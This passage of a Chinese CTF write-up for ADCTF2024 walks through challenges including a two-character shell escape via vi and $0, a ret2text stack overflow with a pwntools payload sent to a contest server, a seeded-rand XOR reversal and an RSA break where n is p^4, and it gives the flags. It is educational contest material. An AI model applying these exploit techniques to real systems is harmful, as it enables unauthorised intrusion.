class="string">&quot;&quot;</span>) + <span class="string">&quot;喵~&quot;</span>)</span><br><span class="line">            MeowCount += <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;你一共学了 <span class="subst">&#123;MeowCount&#125;</span> 次猫叫&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>然后就能够得到flag了，顺带能得到喵了22声</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/vmware_Uk9GyHvERp.png"></p>
<h2 id="Easy-binsh"><a href="#Easy-binsh" class="headerlink" title="[Easy] binsh"></a>[Easy] binsh</h2><p>反编译后得到源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+1h] [rbp-Fh]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nEnter your command:\n&gt; &quot;</span>);</span><br><span class="line">    fgets(&amp;s, <span class="number">3</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">104</span> )</span><br><span class="line">      v4 = <span class="number">98</span>;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">    system(&amp;s);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现每次读2个字符就会断开，并且如果第二个是<code>h</code>（104），就改为<code>b</code>（98），所以<code>sh</code>会变成<code>sb</code>（诶不是你这题咋还骂人呢）</p>
<p>只能输入两个字符，所以我想到的命令是<code>ls</code>，<code>df</code>，<code>du</code>，<code>sh</code>，<code>vi</code></p>
<h3 id="非预期做法"><a href="#非预期做法" class="headerlink" title="非预期做法"></a>非预期做法</h3><p>当然，<code>df</code> <code>du</code>都没什么用，<code>sh</code>会变成<code>sb</code>，<code>ls</code>可以得到flag的文件名就叫flag，而且在当前目录，于是我就转向了<code>vi</code></p>
<p>使用<code>vi</code>打开vim编辑器，然后通过vim编辑器的命令来读取</p>
<p>我一开始是直接<code>:!cat flag</code>，但是发现因为输出问题，会被挡住</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/mstsc_KwVfannxZj.png"></p>
<p>所以改成了<code>:r !cat flag</code>，<code>:r</code>可以把运行的结果保存在当前编辑器中，所以我就可以直接看到flag了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/mstsc_s4PZtcktgw.png"></p>
<h3 id="预期做法"><a href="#预期做法" class="headerlink" title="预期做法"></a>预期做法</h3><p>预期做法是用<code>$0</code>，linux的<code>$0</code>表示当前运行程序&#x2F;脚本的名称，所以在这个环境下，<code>$0</code>表示<code>/bin/sh</code>，也就可以变相调用<code>sh</code>命令，突破2个字符的限制</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/mstsc_jpPZp3ZWIm.png"></p>
<h2 id="Easy-ret2text（赛后出）"><a href="#Easy-ret2text（赛后出）" class="headerlink" title="[Easy] ret2text（赛后出）"></a><strong>[Easy]</strong> ret2text（赛后出）</h2><p>反编译得到源码，发现后门函数vuln</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">96</span>]; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;welcome to this ghost ship,what can i help you?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;captian Jack always say : &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;The living can&#x27;t reach this ghost ship&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Anyway,how old are you now&gt;&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;So what are you going to say?\n&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;I got it,goodbye~\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到buf为96长，读取的长度受第一次的输入age决定，但是输入长度是正数，所以会被强制取正(unsigned)，所以输入负数就能够绕过95的限制</p>
<p>再发现后门函数backdoor</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line">; int backdoor()</span><br><span class="line">public backdoor</span><br><span class="line">backdoor proc near</span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">mov     edi, offset s   ; &quot;hahaha,not bad&quot;</span><br><span class="line">call    _puts</span><br><span class="line">mov     edi, offset command ; &quot;cat flag&quot;</span><br><span class="line">call    _system</span><br><span class="line">nop</span><br><span class="line">pop     rbp</span><br><span class="line">retn</span><br><span class="line">; &#125; // starts at 400616</span><br><span class="line">backdoor endp</span><br></pre></td></tr></table></figure>

<p>地址为<code>0x400616</code>，所以写payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">backdoor_addr = <span class="number">0x400616</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">96</span>)</span><br><span class="line">payload += p64(backdoor_addr)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">b&#x27;./ret2text&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&quot;-1&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>一跑，诶？怎么不对呢？这个时候J佬出了，后面问了一下，我没<code>+8</code>……</p>
<p>行吧，改一改就出来了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">backdoor_addr = <span class="number">0x400616</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">96</span>) + cyclic(<span class="number">8</span>)</span><br><span class="line">payload += p64(backdoor_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(b&#x27;./ret2text&#x27;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;120.76.118.202&quot;</span>, <span class="number">33005</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Type your passphrase: &quot;</span>, <span class="string">b&quot;cf2e30b452d6fe2a5701a260530ecf9e&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;-1&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后就能够做出来了……痛失800pts</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/mstsc_B7gi9BA26S.png"></p>
<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="Easy-checkin"><a href="#Easy-checkin" class="headerlink" title="[Easy] checkin"></a><strong>[Easy]</strong> checkin</h2><p>直接IDA反编译，得到源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  srand(<span class="number">0x7E8</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input the flag:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) != <span class="number">29</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">28</span>; ++i )</span><br><span class="line">    s[i] ^= rand();</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s, encoded) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Congratulations!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">LABEL_7:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为Python的randint需要指定范围，我也不知道C的<code>rand()</code>的范围是多少，所以直接用C梭哈</p>
<p>由异或运算的性质，我们可以通过它的可逆性得到原始flag</p>
<p>先获取原始flag的数据</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> encoded[] = &#123; <span class="number">0x55</span>, <span class="number">0x17</span>, <span class="number">0xC9</span>, <span class="number">0xBB</span>, <span class="number">0x4A</span>, <span class="number">0xA5</span>, <span class="number">0x86</span>, <span class="number">0xDF</span>, <span class="number">0x24</span>, <span class="number">0x0A</span>, <span class="number">0x1C</span>, <span class="number">0xA3</span>, <span class="number">0x27</span>, <span class="number">0xA1</span>, <span class="number">0x57</span>, <span class="number">0x35</span>, <span class="number">0xC3</span>, <span class="number">0xDB</span>, <span class="number">0x91</span>, <span class="number">0x88</span>, <span class="number">0x6D</span>, <span class="number">0x91</span>, <span class="number">0xA0</span>, <span class="number">0xCC</span>, <span class="number">0x71</span>, <span class="number">0x57</span>, <span class="number">0x71</span>, <span class="number">0xE4</span>, <span class="number">0x40</span>, <span class="number">0x00</span> &#125;;</span><br><span class="line">    <span class="type">char</span> decrypted[<span class="number">40</span>];</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    </span><br><span class="line">    srand(<span class="number">0x7E8</span>);  <span class="comment">// 设置随机种子与加密时相同</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解密过程</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">29</span>; i++) &#123;</span><br><span class="line">        decrypted[i] = encoded[i] ^ rand();</span><br><span class="line">    &#125;</span><br><span class="line">    decrypted[<span class="number">29</span>] = <span class="string">&#x27;\0&#x27;</span>; <span class="comment">// 添加字符串结束符</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出解密后的字符串</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">29</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\\x%02X&quot;</span>, (<span class="type">unsigned</span> <span class="type">char</span>)decrypted[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到结果为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x66\x6C\x61\x67\x7B\x79\x30\x75\x5F\x4B\x6E\x6F\x77\x5F\x72\x41\x6E\x64\x30\x6D\x5F\x34\x6E\x64\x5F\x78\x4F\x72\x7D</span><br></pre></td></tr></table></figure>

<p>再写一个Python脚本来验证一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;checkin&quot;</span>)</span><br><span class="line"></span><br><span class="line">cal_flag = <span class="string">&quot;\x66\x6C\x61\x67\x7B\x79\x30\x75\x5F\x4B\x6E\x6F\x77\x5F\x72\x41\x6E\x64\x30\x6D\x5F\x34\x6E\x64\x5F\x78\x4F\x72\x7D&quot;</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Please input the flag:&quot;</span>, cal_flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(io.recvall().decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现结果正确</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/vmware_M598M4Dwss.png"></p>
<p>最后转为ASCII字符，得到flag为<code>flag&#123;y0u_Know_rAnd0m_4nd_xOr&#125;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/vmware_ppTUu5XFfy.png"></p>
<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="Normal-Use-Many-Time"><a href="#Normal-Use-Many-Time" class="headerlink" title="[Normal] Use_Many_Time"></a>[Normal] Use_Many_Time</h2><p>得到题目源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">p = getPrime(<span class="number">2048</span>)</span><br><span class="line"></span><br><span class="line">n = p ** <span class="number">4</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 271472624424656513785706923680771932133715054033425980394077073568817784367419534373403335781047213279328099684778631075010020852340363239109929257593123636490472788742710500691829271154406656967499570620808599990809022444747721621226472999098447873973754640477256467566021323433300316782379572843249101957097476171914061796763882160221810752037588477825281339421214989804806106422337645286183603182582435570582060051797114488129892907097969025919044345960281472097528350236904382867201532480293547156397634024888874181247945486724100923198368861164414053799229573809643496189560293961228262358439897447721272077026577955596476378495555781331390802631948596505810532333928413691919085783591350817862501247468922625100225243353014466352465524402884992557288475473449673329173477799355005388403603540849669807448000951133101061837473065442841126173160221586401667999743065475436042231713071217028338553851930804379457014815136497217622172942725789731656487365400662759041673246263952305177330273165040055678540346032835777756018333782404380070921037783724200080770052468396586141345852821959354352496376533002799798666280242749703930834932216393024552332394747366870653579192862981203841223970368967884378029041333485930753022670356279089241919852655226148387261758145662448291834484689828355196376588241880452162468344771724832727747146706203875543683244719198324124061667256741010066117105718405978693348972717642194095091616302700592766673624550504917867603634542541368375740266071937725051550575451618436991290662488896868128637569245079892637758352664528618064223657481155853608868600031926390171851091738102791194299611556416648756888113654937238624189138830880418480962906152416654876445398057632196937986995992085822575718165073591892866350194485467016785653412183994633115928254714676975956375674614875957033175065090009966949952689186250766814233600527752382571007342869177096365187528130392174264920694275768322770528821969405178452047175169237214071424708443772771459072348156584802498912079521950348331820925988369966076070172436223669851674684504470256163223470647039446081938764730223121989464510919117939913290460289762676092275797366737539534123024502760506615782714363240028877215121539549927135722120154270580276684945221133223162306832578280630822912653337205489280151793861613547764311383072014368485459881701386311716195796935045277483356584921699345142082381019935250848231570451880495222569509469558179017999387883489730684745699017658729849361</span></span><br><span class="line"><span class="comment"># c = 262959409928901942946356967282715685988402717525722998413073199552344194569815462675208727317356069038143476887785349729074152415468561305043719564044443534943678461691194112819829009942015928217138669440068055198678626228169095209700084857903899952032493859312798134830127847836090483339421488013318184521018942602658859674923143870041870487415119261615851991532534606572685371087892175187669735837173802901707243259478231127246547498003861531872712139399220445465633130401043038236189470250375275092537677136076465523278093135254194321212116731237463794930347080005994129860018818529190275740308829411887853496055005914245757890730455096895759851033070483269010908006762902321856837578539257154697504866923667155835568667100011559417194297036546745102722888382810645788593405822297665771079070110912560494209334914533558309387853851664235646634342550739566564027709387611635084010476988602665679274092312701989498548485452833766131120307212434583895800389361158177620204656479294383838488961384696760004965555832729706574445815485286337177591334864985323203962452816823109401292600686290645753703318285223851373494687341332009673985128472618489951377449004314976075061089812435706552393436214957004589524906307287978580991550974217938678109879592869816607502026007252288475327472451287082697741140324509606631465050160462644047707063687221390874129122094235339213836858331145379658693745765989963094532579285786465378971800497606443969187141241371884417409400393554875676670693772124227967787087249970176123360898925123323833553629516940180273052472844245188596972497171407972537936080054594306016800782067609134239410680549083033727692776112628144869503299586655898231079773579227330327159838200652203600435140335585943871110523667774597723803449181446601397378968006674324753246013580929038935474151143294980592601911423698794436171646021633991328190789552835952437637863496011173604086905984318805710258969051632322326111378923301936151648733712292832400228718852555700089350581693206572448860973715415938816675920101336567495654357573191994730856103857549775016982813567025601029715927459867603513676152935188298681539416993775403152002836985599653470480800354152755275582198243528888697069870892345692931591655818148732228227890569700323009808337822568147429445530219871559528924454126891741517141491673059521896789132434077118608327133800491064640223646492279791064413028951228474075277822487467158841147454754127758427097085005104226495027785164273717534964</span></span><br></pre></td></tr></table></figure>

<p>因为发现n&#x3D;p^4，所以可以通过n来退出p，所以直接GPT梭哈</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知信息</span></span><br><span class="line">n = <span class="number">271472624424656513785706923680771932133715054033425980394077073568817784367419534373403335781047213279328099684778631075010020852340363239109929257593123636490472788742710500691829271154406656967499570620808599990809022444747721621226472999098447873973754640477256467566021323433300316782379572843249101957097476171914061796763882160221810752037588477825281339421214989804806106422337645286183603182582435570582060051797114488129892907097969025919044345960281472097528350236904382867201532480293547156397634024888874181247945486724100923198368861164414053799229573809643496189560293961228262358439897447721272077026577955596476378495555781331390802631948596505810532333928413691919085783591350817862501247468922625100225243353014466352465524402884992557288475473449673329173477799355005388403603540849669807448000951133101061837473065442841126173160221586401667999743065475436042231713071217028338553851930804379457014815136497217622172942725789731656487365400662759041673246263952305177330273165040055678540346032835777756018333782404380070921037783724200080770052468396586141345852821959354352496376533002799798666280242749703930834932216393024552332394747366870653579192862981203841223970368967884378029041333485930753022670356279089241919852655226148387261758145662448291834484689828355196376588241880452162468344771724832727747146706203875543683244719198324124061667256741010066117105718405978693348972717642194095091616302700592766673624550504917867603634542541368375740266071937725051550575451618436991290662488896868128637569245079892637758352664528618064223657481155853608868600031926390171851091738102791194299611556416648756888113654937238624189138830880418480962906152416654876445398057632196937986995992085822575718165073591892866350194485467016785653412183994633115928254714676975956375674614875957033175065090009966949952689186250766814233600527752382571007342869177096365187528130392174264920694275768322770528821969405178452047175169237214071424708443772771459072348156584802498912079521950348331820925988369966076070172436223669851674684504470256163223470647039446081938764730223121989464510919117939913290460289762676092275797366737539534123024502760506615782714363240028877215121539549927135722120154270580276684945221133223162306832578280630822912653337205489280151793861613547764311383072014368485459881701386311716195796935045277483356584921699345142082381019935250848231570451880495222569509469558179017999387883489730684745699017658729849361</span></span><br><span class="line">c = <span class="number">262959409928901942946356967282715685988402717525722998413073199552344194569815462675208727317356069038143476887785349729074152415468561305043719564044443534943678461691194112819829009942015928217138669440068055198678626228169095209700084857903899952032493859312798134830127847836090483339421488013318184521018942602658859674923143870041870487415119261615851991532534606572685371087892175187669735837173802901707243259478231127246547498003861531872712139399220445465633130401043038236189470250375275092537677136076465523278093135254194321212116731237463794930347080005994129860018818529190275740308829411887853496055005914245757890730455096895759851033070483269010908006762902321856837578539257154697504866923667155835568667100011559417194297036546745102722888382810645788593405822297665771079070110912560494209334914533558309387853851664235646634342550739566564027709387611635084010476988602665679274092312701989498548485452833766131120307212434583895800389361158177620204656479294383838488961384696760004965555832729706574445815485286337177591334864985323203962452816823109401292600686290645753703318285223851373494687341332009673985128472618489951377449004314976075061089812435706552393436214957004589524906307287978580991550974217938678109879592869816607502026007252288475327472451287082697741140324509606631465050160462644047707063687221390874129122094235339213836858331145379658693745765989963094532579285786465378971800497606443969187141241371884417409400393554875676670693772124227967787087249970176123360898925123323833553629516940180273052472844245188596972497171407972537936080054594306016800782067609134239410680549083033727692776112628144869503299586655898231079773579227330327159838200652203600435140335585943871110523667774597723803449181446601397378968006674324753246013580929038935474151143294980592601911423698794436171646021633991328190789552835952437637863496011173604086905984318805710258969051632322326111378923301936151648733712292832400228718852555700089350581693206572448860973715415938816675920101336567495654357573191994730856103857549775016982813567025601029715927459867603513676152935188298681539416993775403152002836985599653470480800354152755275582198243528888697069870892345692931591655818148732228227890569700323009808337822568147429445530219871559528924454126891741517141491673059521896789132434077118608327133800491064640223646492279791064413028951228474075277822487467158841147454754127758427097085005104226495027785164273717534964</span></span><br><span class="line"><span class="comment"># n = p^4, 需要从 n 中提取出 p</span></span><br><span class="line">p = gmpy2.iroot(n, <span class="number">4</span>)[<span class="number">0</span>]  <span class="comment"># 计算整数四次方根</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># RSA 解密公式 m = c^d mod n，d 是 e 的模逆</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 求出 e 的模逆 d</span></span><br><span class="line">d = inverse(e, (p ** <span class="number">4</span> - p ** <span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密 c，得到 m</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 m 转换为 flag</span></span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最后得到flag为<code>flag&#123;another_weird_construction&#125;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/ADCTF2024-Writeup/mstsc_FycAB2f8eq.png"></p>
<h2 id="Normal-Too-Close-To-Sqrt"><a href="#Normal-Too-Close-To-Sqrt" class="headerlink" title="[Normal] Too_Close_To_Sqrt"></a><strong>[Normal]</strong> Too_Close_To_Sqrt</h2><p>题目源码如下</p>
